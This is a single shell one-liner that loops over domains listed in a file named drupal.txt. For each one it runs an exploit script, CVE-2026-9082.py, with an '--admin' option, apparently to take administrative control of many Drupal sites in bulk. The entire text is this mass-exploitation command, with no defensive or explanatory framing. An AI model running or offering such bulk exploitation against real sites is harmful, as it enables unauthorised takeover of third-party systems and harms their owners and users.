while read domain; do python3 CVE-2026-9082.py -u "https://$domain" --admin; done < drupal.txt
